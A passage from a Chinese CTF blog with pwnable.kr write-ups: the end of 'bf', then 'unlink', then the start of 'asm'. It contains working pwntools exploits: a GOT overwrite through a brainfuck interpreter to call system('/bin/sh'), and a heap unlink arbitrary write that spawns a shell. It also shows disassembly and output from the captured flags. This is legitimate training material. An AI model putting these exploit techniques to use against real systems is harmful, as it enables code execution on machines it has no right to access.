coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)    </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./bf'</span>)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>) <span class="comment">#本地libc(使用ldd查看)</span></span><br><span class="line">        elf = r.elf</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</span><br><span class="line">        libc = ELF(<span class="string">'./bf_libc.so'</span>)</span><br><span class="line">        elf = ELF(<span class="string">'./bf'</span>)</span><br><span class="line">        </span><br><span class="line">    p_addr      = <span class="number">0x0804a0a0</span></span><br><span class="line">    main_addr   = <span class="number">0x08048671</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#bf got addr</span></span><br><span class="line">    fgets_got   = elf.got[<span class="string">'fgets'</span>]</span><br><span class="line">    memset_got  = elf.got[<span class="string">'memset'</span>]</span><br><span class="line">    putchar_got = elf.got[<span class="string">'putchar'</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#bf_libc.so function offset with 'fgets'</span></span><br><span class="line">    gets_offset = libc.symbols[<span class="string">'gets'</span>]-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">    system_offset = libc.symbols[<span class="string">'system'</span>]-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">']\n'</span>)</span><br><span class="line">    payload = <span class="string">'&lt;'</span>*(p_addr-fgets_got)+<span class="string">'.&gt;'</span>*<span class="number">4</span> <span class="comment">#get fgets_addr</span></span><br><span class="line">    payload += <span class="string">'&lt;'</span>*<span class="number">4</span>+<span class="string">',&gt;'</span>*<span class="number">4</span> <span class="comment">#set system_addr to fgets_got</span></span><br><span class="line">    payload += <span class="string">'&gt;'</span>*(memset_got-fgets_got<span class="number">-4</span>)+<span class="string">',&gt;'</span>*<span class="number">4</span> <span class="comment">#set gets_addr to memset_got </span></span><br><span class="line">    payload += <span class="string">'&gt;'</span>*(putchar_got-memset_got<span class="number">-4</span>)+<span class="string">',&gt;'</span>*<span class="number">4</span> <span class="comment">#set main_addr to putchar_got</span></span><br><span class="line">    payload += <span class="string">'.'</span> <span class="comment">#call putchar to call main</span></span><br><span class="line">    </span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    fgets_addr  = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">4</span>):</span><br><span class="line">        fgets_addr += r.recv(<span class="number">1</span>)</span><br><span class="line">    fgets_addr = u32(fgets_addr)</span><br><span class="line">    gets_addr   = fgets_addr+gets_offset</span><br><span class="line">    system_addr = fgets_addr+system_offset</span><br><span class="line">    </span><br><span class="line">    r.sendline(p32(system_addr)+p32(gets_addr)+p32(main_addr)+<span class="string">'/bin/sh'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">welcome to brainfuck testing system!!</span><br><span class="line"><span class="built_in">type</span> some brainfuck instructions except [ ]</span><br><span class="line">$ ls</span><br><span class="line">brainfuck</span><br><span class="line">flag</span><br><span class="line">libc-2.23.so</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">BrainFuck? what a weird language..</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目很基础，加深了对基础的理解。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/21/pwnable.kr-unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/21/pwnable.kr-unlink/" itemprop="url">
                  pwnable.kr-unlink
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-21 20:26:00" itemprop="dateCreated datePublished" datetime="2018-02-21T20:26:00+08:00">2018-02-21</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/21/pwnable.kr-unlink/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/21/pwnable.kr-unlink/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/21/pwnable.kr-unlink/" class="leancloud_visitors" data-flag-title="pwnable.kr-unlink">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一道简化了的linux下<code>malloc</code>堆溢出漏洞利用。需要理解linux下关于<code>glibc的堆管理</code>的相关内容，<a href="http://blog.csdn.net/maokelong95/article/details/51989081#allocated-chunk" target="_blank" rel="noopener">参考</a></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析源码<code>unlink.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">	OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line">	<span class="comment">// heap overflow!</span></span><br><span class="line">	gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// exploit this unlink!</span></span><br><span class="line">	unlink(B);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序很简单完全就是教学版的<code>unlink堆溢出利用</code>。程序在<code>gets(A-&gt;buf)</code>处存在堆溢出漏洞，之后调用<code>unlink(B)</code>函数把<code>B</code>节点从链表中取下来。这个函数中，如果控制了<code>P</code>节点的<code>fb</code>和<code>bk</code>指针，那么就可以造成任意地址写入，写入过程是<code>将bk写入fb+4表示的地址处，将fb写入bk表示的地址处</code>。要想写入想要的地址，必须要保证两步写入操作不会触发写异常保护，这里需要控制<code>esp</code>的值来使<code>main</code>函数在返回时执行<code>ret</code>指令将<code>shell</code>地址赋给<code>eip</code>。<br>下面分析<code>main</code>函数反汇编代码，来构造<code>payload</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">0804852f &lt;main&gt;:</span><br><span class="line"> 804852f:	8d 4c 24 04          	lea    0x4(%esp),%ecx</span><br><span class="line"> 8048533:	83 e4 f0             	and    $0xfffffff0,%esp</span><br><span class="line"> 8048536:	ff 71 fc             	pushl  -0x4(%ecx)</span><br><span class="line"> 8048539:	55                   	push   %ebp</span><br><span class="line"> 804853a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 804853c:	51                   	push   %ecx</span><br><span class="line"> 804853d:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 8048540:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048543:	68 00 04 00 00       	push   $0x400</span><br><span class="line"> 8048548:	e8 53 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804854d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048550:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048553:	6a 10                	push   $0x10</span><br><span class="line"> 8048555:	e8 46 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804855a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804855d:	89 45 ec             	mov    %eax,-0x14(%ebp)</span><br><span class="line"> 8048560:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048563:	6a 10                	push   $0x10</span><br><span class="line"> 8048565:	e8 36 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804856a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804856d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048570:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048573:	6a 10                	push   $0x10</span><br><span class="line"> 8048575:	e8 26 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804857a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804857d:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048580:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048583:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048586:	89 10                	mov    %edx,(%eax)</span><br><span class="line"> 8048588:	8b 55 ec             	mov    -0x14(%ebp),%edx</span><br><span class="line"> 804858b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 804858e:	89 50 04             	mov    %edx,0x4(%eax)</span><br><span class="line"> 8048591:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048594:	8b 55 f0             	mov    -0x10(%ebp),%edx</span><br><span class="line"> 8048597:	89 10                	mov    %edx,(%eax)</span><br><span class="line"> 8048599:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 804859c:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 804859f:	89 50 04             	mov    %edx,0x4(%eax)</span><br><span class="line"> 80485a2:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80485a5:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line"> 80485a8:	50                   	push   %eax</span><br><span class="line"> 80485a9:	68 98 86 04 08       	push   $0x8048698</span><br><span class="line"> 80485ae:	e8 cd fd ff ff       	call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 80485b3:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485b6:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 80485b9:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80485bc:	50                   	push   %eax</span><br><span class="line"> 80485bd:	68 b8 86 04 08       	push   $0x80486b8</span><br><span class="line"> 80485c2:	e8 b9 fd ff ff       	call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 80485c7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485ca:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485cd:	68 d8 86 04 08       	push   $0x80486d8</span><br><span class="line"> 80485d2:	e8 d9 fd ff ff       	call   80483b0 &lt;puts@plt&gt;</span><br><span class="line"> 80485d7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485da:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 80485dd:	83 c0 08             	add    $0x8,%eax</span><br><span class="line"> 80485e0:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485e3:	50                   	push   %eax</span><br><span class="line"> 80485e4:	e8 a7 fd ff ff       	call   8048390 &lt;gets@plt&gt;</span><br><span class="line"> 80485e9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485ec:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485ef:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 80485f2:	e8 0d ff ff ff       	call   8048504 &lt;unlink&gt;</span><br><span class="line"> 80485f7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485fa:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 80485ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx</span><br><span class="line"> 8048602:	c9                   	leave  </span><br><span class="line"> 8048603:	8d 61 fc             	lea    -0x4(%ecx),%esp</span><br><span class="line"> 8048606:	c3                   	ret    </span><br><span class="line"> 8048607:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 8048609:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860b:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860d:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860f:	90                   	nop</span><br></pre></td></tr></table></figure></p>
<p>可以发现<code>A,B,C</code>三个节点的栈地址分别是<code>ebp-0x14,ebp-0xc,ebp-0x10</code>，在函数结尾发现<code>ret</code>指令之前是<code>lea -0x4(%ecx),%esp</code>,说明<code>esp</code>最后会被<code>ecx</code>修改，而<code>ecx</code>又会被指令<code>mov -0x4(%ebp),%ecx</code>修改。于是要想把esp所表示地址的内容改为shell的地址，可以通过更改<code>ebp-4</code>的内容为<code>shell地址+4</code>来实现,而<code>ebp-4</code>的地址可以通过<code>A</code>地址来计算，它们的相对偏移为<code>ebp-4-(ebp-0x14)=16</code>。则堆块的内存布局如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+--------------+   &lt;= A</span><br><span class="line">|   fd        |    bk        |</span><br><span class="line">|shell_addr   |  aaaa        |</span><br><span class="line">+-------------+--------------+   &lt;= B</span><br><span class="line">|    aaaaaaaa(chunk size)    |</span><br><span class="line">|heap_addr+8+4|stack_addr+16 |</span><br><span class="line">|            buf             |</span><br><span class="line">+-------------+--------------+</span><br></pre></td></tr></table></figure></p>
<p>要注意的是题目平台是64位系统，所以存储<code>chunk size</code>信息需要8字节，exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'unlink'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line">ss = s.run(<span class="string">'./unlink'</span>)</span><br><span class="line">ss.recvuntil(<span class="string">'here is stack address leak: '</span>)</span><br><span class="line">stack_addr = int(ss.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">ss.recvuntil(<span class="string">'here is heap address leak: '</span>)</span><br><span class="line">heap_addr = int(ss.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">ss.sendline(p32(shell_addr)+<span class="string">'a'</span>*<span class="number">12</span>+p32(heap_addr+<span class="number">8</span>+<span class="number">4</span>)+p32(stack_addr+<span class="number">16</span>))</span><br><span class="line">ss.interactive()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># python 1.py</span></span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn<span class="string">'t check security settings on '</span>pwnable.kr<span class="string">'</span></span><br><span class="line"><span class="string">[+] Opening new channel: '</span>./unlink<span class="string">': Done</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">now that you have leaks, get shell!</span></span><br><span class="line"><span class="string">$ $ ls</span></span><br><span class="line"><span class="string">flag  intended_solution.txt  unlink  unlink.c</span></span><br><span class="line"><span class="string">$ $ cat flag</span></span><br><span class="line"><span class="string">conditional_write_what_where_from_unl1nk_explo1t</span></span><br><span class="line"><span class="string">$ $</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做这道题目搜索了很多关于<code>glibc堆管理</code>的相关内容，学到了不少，这里推荐<a href="https://chybeta.github.io/2017/08/19/Software-Security-Learning/" target="_blank" rel="noopener">一篇博文</a>，它记录了很多关于软件安全方向的知识链接，很适合学习。另外pwable.kr的第一部分终于做完了，学到了不少基础知识，希望能在二进制的道路上越走越远。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/14/pwnable.kr-asm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/14/pwnable.kr-asm/" itemprop="url">
                  pwnable.kr-asm
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-14 11:18:00" itemprop="dateCreated datePublished" datetime="2018-02-14T11:18:00+08:00">2018-02-14</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/14/pwnable.kr-asm/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/14/pwnable.kr-asm/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/14/pwnable.kr-asm/" class="leancloud_visitors" data-flag-title="pwnable.kr-asm">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题就是写shellcode的</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析源码<code>asm.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	<span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	